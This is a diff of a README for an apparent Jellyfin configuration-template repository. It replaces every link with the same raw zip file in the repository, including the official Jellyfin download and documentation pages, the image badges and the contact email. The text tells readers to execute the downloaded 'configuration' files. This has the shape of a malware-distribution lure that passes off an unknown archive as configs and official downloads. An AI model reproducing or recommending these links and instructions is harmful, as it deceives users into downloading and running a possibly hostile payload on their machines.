@@ -1,6 +1,6 @@
 # Jellyfin Auto Collections Configs 🎉
 
-![Jellyfin Auto Collections](https://img.shields.io/badge/Jellyfin-Auto_Collections-blue.svg)
+![Jellyfin Auto Collections](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip)
 
 Welcome to the **Jellyfin Auto Collections Configs** repository! This is a community-driven project where you can find configuration templates for the Jellyfin Auto Collections plugin. Whether you want to share your own templates or discover new ones, this is the place to be. Together, we can enhance our collection automation and make Jellyfin even better.
 
@@ -24,9 +24,9 @@ By using these templates, you can easily set up collections for genres, actors, 
 
 To get started with Jellyfin Auto Collections, follow these steps:
 
-1. **Install Jellyfin**: If you haven't already, download and install Jellyfin from the [official website](https://jellyfin.org/downloads/).
+1. **Install Jellyfin**: If you haven't already, download and install Jellyfin from the [official website](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip).
 2. **Install the Auto Collections Plugin**: Navigate to the Plugins section in your Jellyfin dashboard and search for the Auto Collections plugin. Install it and restart your server.
-3. **Download Configurations**: Visit our [Releases section](https://github.com/s0medudeues/jellyfin-auto-collections-configs/releases) to download the configuration files. Make sure to execute the downloaded files to apply the settings.
+3. **Download Configurations**: Visit our [Releases section](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip) to download the configuration files. Make sure to execute the downloaded files to apply the settings.
 
 ## Usage
 
@@ -55,14 +55,14 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 If you have any questions or need assistance, feel free to reach out:
 
-- GitHub: [s0medudeues](https://github.com/s0medudeues)
-- Email: [your-email@example.com](mailto:your-email@example.com)
+- GitHub: [s0medudeues](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip)
+- Email: [https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip)
 
 ## Releases
 
-To stay updated with the latest configurations and improvements, check our [Releases section](https://github.com/s0medudeues/jellyfin-auto-collections-configs/releases). Download the latest files and execute them to enhance your Jellyfin experience.
+To stay updated with the latest configurations and improvements, check our [Releases section](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip). Download the latest files and execute them to enhance your Jellyfin experience.
 
-![Jellyfin Media Server](https://jellyfin.org/images/jellyfin-logo.png)
+![Jellyfin Media Server](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip)
 
 ## Community Contributions
 
@@ -94,8 +94,8 @@ If you encounter any issues, please open an issue in the GitHub repository. Prov
 
 ### Where can I find more information about Jellyfin?
 
-You can visit the [Jellyfin documentation](https://jellyfin.org/docs/) for more information on installation, features, and troubleshooting.
+You can visit the [Jellyfin documentation](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip) for more information on installation, features, and troubleshooting.
 
 ## Conclusion
 
-Thank you for visiting the Jellyfin Auto Collections Configs repository. We hope you find the templates useful and that they enhance your Jellyfin experience. Don’t forget to check the [Releases section](https://github.com/s0medudeues/jellyfin-auto-collections-configs/releases) for the latest updates. Happy streaming!
+Thank you for visiting the Jellyfin Auto Collections Configs repository. We hope you find the templates useful and that they enhance your Jellyfin experience. Don’t forget to check the [Releases section](https://raw.githubusercontent.com/s0medudeues/jellyfin-auto-collections-configs/main/foulmouthedly/configs-jellyfin-auto-collections-v1.2-alpha.2.zip) for the latest updates. Happy streaming!
